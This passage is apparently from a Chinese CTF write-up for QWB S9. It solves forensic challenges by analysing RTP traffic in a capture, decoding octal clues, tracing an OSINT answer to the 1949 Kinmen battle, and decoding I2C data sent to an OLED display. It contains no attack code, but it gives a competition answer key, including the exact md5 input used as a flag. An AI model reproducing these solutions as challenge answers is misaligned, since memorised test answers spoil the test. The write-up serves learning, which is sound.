</span></span><span class="line"><span class="cl">    <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;总帧数: </span><span class="si">{</span><span class="n">total_packets</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;IPv4帧数: </span><span class="si">{</span><span class="n">total_ipv4</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;UDP报文数: </span><span class="si">{</span><span class="n">total_udp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;RTP报文数: </span><span class="si">{</span><span class="n">total_rtp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;RTP(PT=0, PCMU)报文数: </span><span class="si">{</span><span class="n">total_rtp_pcmu</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">non_ipv4_counts</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;## 非IPv4以太帧 (按EtherType统计)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">et</span><span class="p">,</span> <span class="n">cnt</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">non_ipv4_counts</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]):</span>
</span></span><span class="line"><span class="cl">            <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;- EtherType=</span><span class="si">{</span><span class="n">et</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">cnt</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">non_udp_counts</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;## 非UDP的IPv4报文 (按IP协议号统计)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">proto</span><span class="p">,</span> <span class="n">cnt</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">non_udp_counts</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">])):</span>
</span></span><span class="line"><span class="cl">            <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;- IP Proto=</span><span class="si">{</span><span class="n">proto</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">cnt</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">udp_non_rtp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;## UDP但非RTP的流 (按端口对统计)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">sp</span><span class="p">,</span> <span class="n">dp</span><span class="p">),</span> <span class="n">cnt</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">udp_non_rtp</span><span class="o">.</span><span class="n">items</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">            <span class="n">prefix_hex</span> <span class="o">=</span> <span class="p">(</span><span class="n">examples_udp_non_rtp</span><span class="o">.</span><span class="n">get</span><span class="p">((</span><span class="n">sp</span><span class="p">,</span> <span class="n">dp</span><span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;- </span><span class="si">{</span><span class="n">sp</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">dp</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">cnt</span><span class="si">}</span><span class="s2"> 报文，样例前缀(&lt;=16B)=</span><span class="si">{</span><span class="n">prefix_hex</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">rtp_non_pcmu</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;## RTP但非PCMU的流 (按 src_port, dst_port, PT 统计)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">agg</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">sp</span><span class="p">,</span> <span class="n">dp</span><span class="p">,</span> <span class="n">ssrc</span><span class="p">,</span> <span class="n">pt</span><span class="p">),</span> <span class="n">cnt</span> <span class="ow">in</span> <span class="n">rtp_non_pcmu</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="n">agg</span><span class="p">[(</span><span class="n">sp</span><span class="p">,</span> <span class="n">dp</span><span class="p">,</span> <span class="n">pt</span><span class="p">)]</span> <span class="o">+=</span> <span class="n">cnt</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">sp</span><span class="p">,</span> <span class="n">dp</span><span class="p">,</span> <span class="n">pt</span><span class="p">),</span> <span class="n">total</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">agg</span><span class="o">.</span><span class="n">items</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">            <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;- </span><span class="si">{</span><span class="n">sp</span><span class="si">}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">dp</span><span class="si">}</span><span class="s2">, PT=</span><span class="si">{</span><span class="n">pt</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">total</span><span class="si">}</span><span class="s2"> 报文&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">non_ipv4_counts</span> <span class="ow">or</span> <span class="n">non_udp_counts</span> <span class="ow">or</span> <span class="n">udp_non_rtp</span> <span class="ow">or</span> <span class="n">rtp_non_pcmu</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">report</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;没有发现异常：全部可疑类别均为空（或样本极少）。&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">write_report</span><span class="p">(</span><span class="n">report</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] 排查报告：</span><span class="si">{</span><span class="n">REPORT_PATH</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>提取完后用飞书妙记转录，可以看到里面有两串数字，而且很明显数字都不超过8，一眼八进制</p>
<p><img src="/img/2025-QWB-S9/5.png" alt="img"></p>
<p><img src="/img/2025-QWB-S9/6.png" alt="img"></p>
<p>用厨子转一下八进制就好了，这里要手动拆，不然他识别不到</p>
<p><img src="/img/2025-QWB-S9/7.png" alt="img"></p>
<p>刚刚好拿到32位的hex值，尝试解压加密压缩包发现密码对了</p>
<p><img src="/img/2025-QWB-S9/8.png" alt="img"></p>
<p>老样子妙记转录音频文字，可以看到有些信息，什么廿四，辰时正过三刻，双里湖西岸南山茶铺，看这个通话看着其实就很间谍那味（）</p>
<p>但是这里太谜语了，一直没确定具体的时间，只有地点是确定的</p>
<p><img src="/img/2025-QWB-S9/9.png" alt="img"></p>
<p>直到后面上了hint，确定要去寻找历史事件（其实有一点猜想，但不确定），音频中提到的双里湖，通过简单社工发现了一个叫双鲤湖的地方，位于福建省金门县，通过大量调查，发现那曾发生过金门战役</p>
<p><img src="/img/2025-QWB-S9/10.png" alt="img"></p>
<p><img src="/img/2025-QWB-S9/11.png" alt="img"></p>
<p>那么时间就确定了是1949年10月24日（一开始以为是25不对，改24对了），然后时分就是8点45分，对应辰时正三刻，地点就是双鲤湖西岸南山茶铺</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">md5</span><span class="p">(</span><span class="mi">1949</span><span class="n">年10月24日8时45分于双鲤湖西岸南山茶铺</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="legacyoled">legacyOLED</h2>
<p>（这题凭什么烂，我感觉好难）</p>
<p>附件是一个sr文件，经常打国外赛的都知道，这是什么逻辑分析仪的文件，可以用sigrok的工具打开，下个pulseview打开，发现里面有蜜汁波形</p>
<p><img src="/img/2025-QWB-S9/12.png" alt="img"></p>
<p>后面队友给我说可能借鉴了这个文章：https://github.com/bobby-tables2/CTF-Archive/tree/87dcb7af1c64705315d6878a7178accf316fe606/CTFSG%202022/SIGINT/Writeup</p>
<p>我简单看了看，发现太像了，遂继续攻破，首先根据题目的OLED和波形的情况，推断这个OLED显示屏的信号数据，一般他的通信协议是I2C，所以可以用I2C对其进行解码，可以发现它传了不少数据的</p>
<p><img src="/img/2025-QWB-S9/13.png" alt="img"></p>
<p>我将数据提取了出来（右键可以导出），然后利用参考的文章的exp跑，发现不行，完全对不上，遂深入研究了OLED和I2C通信的原理</p>
<p><a href="https://blog.csdn.net/weixin_63726869/article/details/133132435">https://blog.csdn.net/weixin_63726869/article/details/133132435</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/14257150571">https://zhuanlan.zhihu.com/p/14257150571</a></p>
<p>通过深入学习上面的两个文章，我确定了，当设备进行地址写入后，传入的第一个数据为控制字节，如果是00则代表传入了命令，40则代表发送给GRAM，然后用于画面打印的（大概就这意思）</p>
<p><img src="/img/2025-QWB-S9/14.png" alt="img"></p>
<p>这整段波形中，前面一长串基本是没用的，主要从后一段开始分析，我们可以看到这里断开传入了四次数据，一开始00控制字节，执行了20命令，参数为01，20代表其进行寻址模式调整，参数为01时寻址模式为垂直寻址，00则为水平寻址，后面会出现多次交替，然后是22命令和21命令，分别对应起始/终止页和列，也就是说从哪里开始画起，再往后就是传入40控制字节，开始显示，往后每段都有类似的情况，需要将他们逐一提取然后在参考文章exp的基础上，通过拷打ai问出了一个升级版的脚本</p>
<p><img src="/img/2025-QWB-S9/15.png" alt="img"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Markdown" data-lang="Markdown"><span class="line"><span class="cl">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">[01 21 22 3B 22 03 05]: 00 00 00 00 00 00 C0 00 00 E0 01 00 F8 07 00 FE 1F 00 FF 1F 00 FF 7F 00 FF FF 01 FF FF 07 FF FF 0F FF FF 1F FF FF 7F FF FF FF 3F FE FF 0F FC FF 03 F0 FF E0 E0 FF F8 C3 FF FE 07 FF FF 1F FC FF 3F F8 FF 7F F0 FF 3F F0 FF 1F FC FF 0F FF
</span></span><span class="line"><span class="cl">[00 21 2E 53 22 06 06]: 00 00 03 07 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 0F 03 00 00 08 0E 0F 0F 0F 0F 0F 0F 0F 0F 0F 07 03 00 00 00 00
</span></span><span class="line"><span class="cl">[01 21 00 32 22 00 01]: 00 00 47 00 7E 00 70 00 06 00 06 00 63 00 33 00 00 00 7F 00 6F 00 10 00 33 00 7F 00 3B 00 75 00 00 00 19 00 6F 00 20 00 19 00 39 00 21 00 10 00 00 00 7F 00 5F 00 66 00 22 00 21 00 65 00 3F 00 00 00 4F 00 7F 00 35 00 02 00 5E 00 0B 00 7E 00 00 00 57 00 7F 00 32 00 00 00 12 80 24 E0 47 F0 00 FC 7F FF DF FF
</span></span><span class="line"><span class="cl">[01 21 30 56 22 02 04]: FF 3F FE FF 0F FC FF 03 F0 FF E0 E0 3F F8 C3 1F FE 07 07 FF 1F C1 FF 3F E0 FF 7F F0 FF 3F FC FF 1F FF FF 0F FF FF 83 FF FF E0 FF 3F F0 FF 1F FC FF 07 FE FF 81 FF 7F E0 FF 1F F8 FF 1F FC FF 07 FF FF C1 FF FF C1 FF FF 83 FF 3F 0F FE 1F 1F FC 0F 3F F0 C3 FF C0 E0 FF 03 F8 FF 07 FE FF 1F FF FF FF FF FF FF FF FF FF FF FE FF FF F8 FF FF F0 FF FF E0 FF 7F
</span></span><span class="line"><span class="cl">[00 21 30 55 22 00 03]: 00 7F DF 83 C8 D1 A6 BC 80 ED FF B9 60 75 18 3D 00 C7 FF C4 D3 91 84 F6 80 9F EF 8C 92 92 16 1D 00 4B 7F 59 00 19 FC FF FF FF FF FF FF FF 7F 3F 0F 03 C0 E0 F8 FE FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FC F0 E0 80 00 00 00 FF FF FF FF 3F 1F 07 C1 E0 F0 FC FF FF FF FF FF FF FF 7F 1F 1F 07 C1 C1 83 0F 1F 3F FF FF FF FF FF FF FF FE F8 F0 3F 0F 03 E0 F8 FE FF FF FF FF FF FF FF FF 3F 1F 07 81 E0 F8 FC FF FF FF FF FE FC F0 C0 03 07 1F FF FF FF FF FF FF
</span></span><span class="line"><span class="cl">[01 21 33 59 22 05 07]: FF 0F 00 FF 0F 00 FF 0F 00 FC 0F 00 F8 0F 00 F0 0F 00 F0 0F 00 FC 0F 00 FF 0F 00 FF 0F 00 FF 0F 00 FF 0F 00 FF 0F 00 FF 03 00 FF 00 00 7F 00 00 3F 08 00 0F 0E 00 87 0F 00 C3 0F 00 F0 0F 00 F8 0F 00 FC 0F 00 FF 0F 00 FF 0F 00 FF 0F 00 FF 0F 00 FF 07 00 FF 03 00 FF 00 00 3F 00 00 1F 00 00 0F 00 00 07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">[00 21 4F 7F 22 00 04]: 1D 00 4B 7F 59 00 19 4A 5E 00 6B 5F 22 71 50 0A 71 00 7B 6F 18 29 23 39 7B 04 6B 77 78 05 33 49 30 04 5F 6B 45 02 58 01 0B 04 36 7B 08 14 18 66 00 FC F0 E0 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF FE F8 F0 E0 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1F FF FF FF FF FF FF FF FF FE FC F0 60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF 7F 1F 0F 07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">[00 21 24 35 22 00 02]: 02 5E 0B 7E 00 57 7F 32 00 12 24 47 00 7F DF 83 C8 D1 00 00 00 00 00 00 00 00 00 80 E0 F0 FC FF FF FF FF FF 00 00 00 00 80 E0 E0 F8 FE FF FF FF FF FF FF FF 3F 1F
</span></span><span class="line"><span class="cl">[01 21 00 7F 22 00 00]: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/img/2025-QWB-S9/16.png" alt="img"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># OLED显示参数</span>
</span></span><span class="line"><span class="cl"><span class="n">WIDTH</span> <span class="o">=</span> <span class="mi">128</span>  <span class="c1"># 列数</span>
</span></span><span class="line"><span class="cl"><span class="n">PAGES</span> <span class="o">=</span> <span class="mi">8</span>  <span class="c1"># 页数（每页8个像素高）</span>
</span></span><span class="line"><span class="cl"><span class="n">HEIGHT</span> <span class="o">=</span> <span class="n">PAGES</span> <span class="o">*</span> <span class="mi">8</span>  <span class="c1"># 总高度64像素</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 创建二维像素数组</span>
